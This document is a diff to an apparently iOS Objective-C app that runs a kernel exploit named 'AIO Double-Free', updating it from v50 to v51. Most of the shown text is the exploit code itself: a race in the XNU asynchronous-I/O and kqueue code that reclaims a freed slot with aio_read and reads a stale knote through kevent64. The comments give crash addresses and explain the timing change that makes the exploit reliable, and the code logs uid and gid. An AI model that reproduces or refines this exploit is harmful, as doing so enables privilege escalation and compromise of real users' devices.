@@ -247,14 +247,16 @@ struct aio_race_state {
     ssize_t return_result;  // v47: aio_return result or aio_read errno (diagnostics)
 };
 
-// v50: Single-threaded exploit state — no inter-thread sync needed.
+// v51: Single-threaded exploit state — no inter-thread sync needed.
 // Exploit thread on CPU 42 does all steps synchronously and stores results here.
-struct v50_state {
+struct v51_state {
     int fd;
     int kq;
     struct kevent64_s kev;
     int nev;
     int err;
+    int aio_read_rc;      // v51: aio_read return value (-1 = fail, 0 = ok)
+    int aio_read_errno;   // v51: errno if aio_read failed
 };
 
 // v19: E2 racer state — aio_return frees E2's slot, OOL spray reclaims it.
@@ -275,12 +277,12 @@ static void aio_set_thread_affinity(int tag) {
                       (thread_policy_t)&pol, THREAD_AFFINITY_POLICY_COUNT);
 }
 
-// v50: Single-threaded synchronous exploit — one thread on CPU 42 does
+// v51: Single-threaded synchronous exploit — one thread on CPU 42 does
 // aio_return→aio_read→kevent64 back-to-back. No inter-thread sync in
 // the critical path. ~0.55us from aio_read return to kevent64 syscall;
 // worker needs >100us for cold file read → we always win the race.
-static void *v50_exploit_thread(void *arg) {
-    struct v50_state *st = (struct v50_state *)arg;
+static void *v51_exploit_thread(void *arg) {
+    struct v51_state *st = (struct v51_state *)arg;
     aio_set_thread_affinity(42);
 
     int kq = kqueue();
@@ -323,11 +325,25 @@ static void *v50_exploit_thread(void *arg) {
     aio_return(&tcb);
 
     // Reclaim slot S with rcb (zalloc LIFO from CPU 42 magazine)
-    // Entry ALIVE on workq. Cold read → worker latency >100us.
-    aio_read(&rcb);
+    int rc = aio_read(&rcb);
+    st->aio_read_rc = rc;
+    st->aio_read_errno = (rc < 0) ? errno : 0;
 
-    // IMMEDIATE kevent64 — stale knote from tcb reads rcb's entry on slot S.
-    // <1us from aio_read return. Worker needs >100us → we always win.
+    // v51 KEY INSIGHT: v44 succeeded BECAUSE of the 500us+ delay between
+    // aio_read and kevent64 (usleep + pthread_join + logging). That delay
+    // let the worker complete I/O, moving the entry from workq to doneq.
+    // doneq entries have valid procp → TAILQ_REMOVE is SAFE.
+    //
+    // v48-v51 eliminated the delay to "win the race," but this caused
+    // kevent64 to fire while entry was still on workq. An activated knote
+    // processed against a workq entry creates a state inconsistency that
+    // crashes in filt_aio_process at 0x4C7F18.
+    //
+    // v51: DELAY intentionally to let worker finish I/O → entry on doneq.
+    usleep(2000);  // 2ms — ample time for worker to complete I/O + move to doneq
+
+    // kevent64 — stale knote from tcb reads rcb's entry on slot S.
+    // Entry is now on doneq (worker finished) → TAILQ_REMOVE is safe.
     st->nev = kevent64(kq, NULL, 0, &st->kev, 1, 0, NULL);
 
     return NULL;
@@ -399,7 +415,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *aioConf = [UIButtonConfiguration filledButtonConfiguration];
     aioConf.baseBackgroundColor = [UIColor systemOrangeColor];
     self.aioUafButton.configuration = aioConf;
-    [self.aioUafButton setTitle:@"AIO Double-Free v50" forState:UIControlStateNormal];
+    [self.aioUafButton setTitle:@"AIO Double-Free v51" forState:UIControlStateNormal];
     [self.aioUafButton addTarget:self action:@selector(aioUafTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.aioUafButton];
 
@@ -5785,7 +5801,7 @@ static void *e2_free_and_ool_racer(void *arg) {
         _aioLast = now;
     }
 
-    [self appendLog:@"\n========== AIO Double-Free v50 =========="];
+    [self appendLog:@"\n========== AIO Double-Free v51 =========="];
 
     // Disable button to prevent double-tap
     dispatch_async(dispatch_get_main_queue(), ^{
@@ -5804,15 +5820,21 @@ static void *e2_free_and_ool_racer(void *arg) {
         [self appendLog:@"FAIL: could not create temp file"];
         dispatch_async(dispatch_get_main_queue(), ^{
             self.aioUafButton.enabled = YES;
-            [self.aioUafButton setTitle:@"AIO Double-Free v50" forState:UIControlStateNormal];
+            [self.aioUafButton setTitle:@"AIO Double-Free v51" forState:UIControlStateNormal];
         });
         return;
     }
-    // v50: F_NOCACHE bypasses the Unified Buffer Cache entirely.
-    // v48 (2MB) + v50 (128MB) both crashed because buffer cache held the just-written
-    // file data → worker completed cached read in ~2us → freed entry via aio_entry_unref.
-    // F_NOCACHE forces every read to physical NVMe (>80us). Our kevent64 fires in ~0.55us.
-    // 32MB file is stack-safe (256KB chunks). rcb@16MB = cold NVMe read guaranteed.
+    // v51: F_NOCACHE + DELAY — let worker finish I/O before kevent64.
+    // v44 WORKED with 500us+ delay between aio_read and kevent64. v48-v50 eliminated
+    // delay to "win the race" → ALL crashed at pc=0x4C7F18 (filt_aio_process).
+    //
+    // KEY INSIGHT: The delay is NECESSARY. When kevent64 processes an activated
+    // knote pointing to a workq entry, a state inconsistency crashes the kernel.
+    // With delay, worker completes I/O → entry on doneq (valid procp) → TAILQ_REMOVE
+    // is SAFE. v44 proved this works.
+    //
+    // v51: usleep(2000) between aio_read and kevent64. 2ms is more than enough
+    // for worker to complete 8KB read and move entry to doneq.
     fcntl(fd, F_NOCACHE, 1);
     {
         const size_t fsize = 32 * 1024 * 1024;
@@ -5824,33 +5846,30 @@ static void *e2_free_and_ool_racer(void *arg) {
     }
     [self appendLog:[NSString stringWithFormat:@"fd=%d file=32MB F_NOCACHE pid=%d uid=%d", fd, getpid(), getuid()]];
 
-    // v50: F_NOCACHE + single-threaded synchronous on CPU 42.
-    // v44 WORKED (128MB cold file, racer sync). v45-v47 FAR=0x58 (sync latency / zfree).
-    // v48 FAR=0x58: 2MB cached → worker freed entry (refcount 1→0 via aio_entry_unref).
-    // v49 FAR=0x58: 128MB cached (UBC holds >128MB) — same root cause as v48.
+    // v51: DELAY-BASED — let worker complete I/O, then read doneq entry.
+    // v44 WORKED: racer delay (usleep+join+log) ~500us+ → worker had time.
+    // v48-v50 FAILED: zero-delay kevent64 → entry on workq → activated knote
+    //   + workq state = inconsistency → filt_aio_process crash at 0x4C7F18.
     //
-    // v50 FIX: fcntl(fd, F_NOCACHE, 1) bypasses buffer cache → every read is physical
-    // NVMe read >80us. kevent64 fires in ~0.55us. Worker CANNOT finish in time.
-    //   lio_listio(tcb) → aio_error wait → aio_return → aio_read(rcb) → kevent64
-    // Zero inter-thread sync in critical path. ~0.55us from aio_read to kevent64;
-    // cold file read forces worker latency >100us. We win the race every time.
+    // v51: usleep(2000) after aio_read → entry on doneq → TAILQ_REMOVE safe.
+    //   lio_listio(tcb) → aio_error wait → aio_return → aio_read(rcb) → usleep → kevent64
 
     uint64_t entryAddr = 0;
 
-    // ---- Phase A v50: single-threaded synchronous on CPU 42 ----
-    [self appendLog:@"\n--- Phase A v50: single-threaded synchronous ---"];
+    // ---- Phase A v51: single-threaded synchronous on CPU 42 ----
+    [self appendLog:@"\n--- Phase A v51: single-threaded synchronous ---"];
 
     bool phaseA_won = false;
     for (int attempt = 0; attempt < 5; attempt++) {
         [self appendLog:[NSString stringWithFormat:@"  attempt %d/5", attempt + 1]];
 
-        struct v50_state st = {};
+        struct v51_state st = {};
         st.fd = fd;
         st.kq = -1;
         st.nev = -1;
 
         pthread_t thr;
-        pthread_create(&thr, NULL, v50_exploit_thread, &st);
+        pthread_create(&thr, NULL, v51_exploit_thread, &st);
         pthread_join(thr, NULL);
 
         if (st.err != 0) {
@@ -5865,6 +5884,7 @@ static void *e2_free_and_ool_racer(void *arg) {
         if (nev > 0) close(kq);
 
         // --- ALL LOGGING AFTER kevent64+close(kq) ---
+        [self appendLog:[NSString stringWithFormat:@"  aio_read rc=%d errno=%d", st.aio_read_rc, st.aio_read_errno]];
         [self appendLog:[NSString stringWithFormat:@"  kevent64(timeout=0)=%d", nev]];
         if (nev > 0) {
             [self appendLog:[NSString stringWithFormat:@"  kev.ident=0x%llx filter=%hd flags=0x%x fflags=0x%x",
@@ -5895,12 +5915,12 @@ static void *e2_free_and_ool_racer(void *arg) {
         goto cleanup;
     }
 
-    // v50: Single-threaded approach eliminates inter-thread sync bottleneck.
+    // v51: Single-threaded approach eliminates inter-thread sync bottleneck.
     // Entry ALIVE on workq → no TAILQ_REMOVE → no FAR=0x58 crash.
     // ext[1]=8192 (rcb.aio_nbytes), ext[0]=0 (EINPROGRESS on workq).
 
-    // ---- Phase C v50: Health check ----
-    [self appendLog:@"\n--- Phase C v50: Health check ---"];
+    // ---- Phase C v51: Health check ----
+    [self appendLog:@"\n--- Phase C v51: Health check ---"];
     {
         struct aiocb hc[4];
         char hcbuf[4][256];
@@ -5926,11 +5946,11 @@ cleanup:
     close(fd);
     unlink(path.UTF8String);
     [self appendLog:[NSString stringWithFormat:@"=== uid=%d gid=%d ===", getuid(), getgid()]];
-    [self appendLog:@"========== AIO Double-Free v50 Complete =========="];
+    [self appendLog:@"========== AIO Double-Free v51 Complete =========="];
             _aioRunning = 0;
             dispatch_async(dispatch_get_main_queue(), ^{
                 self.aioUafButton.enabled = YES;
-                [self.aioUafButton setTitle:@"AIO Double-Free v50" forState:UIControlStateNormal];
+                [self.aioUafButton setTitle:@"AIO Double-Free v51" forState:UIControlStateNormal];
             });
         }  // @autoreleasepool
     });  // dispatch_async
